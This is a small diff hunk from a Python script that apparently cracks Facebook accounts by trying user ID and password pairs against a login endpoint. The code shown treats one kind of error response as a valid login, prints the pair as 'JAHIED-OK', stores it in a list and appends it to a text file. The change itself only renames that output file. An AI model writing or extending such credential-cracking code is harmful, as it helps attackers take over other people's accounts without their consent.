@@ -1288,7 +1288,7 @@ class Main:
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ JAHIED-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-JAHIED-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-BD JAHIED-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
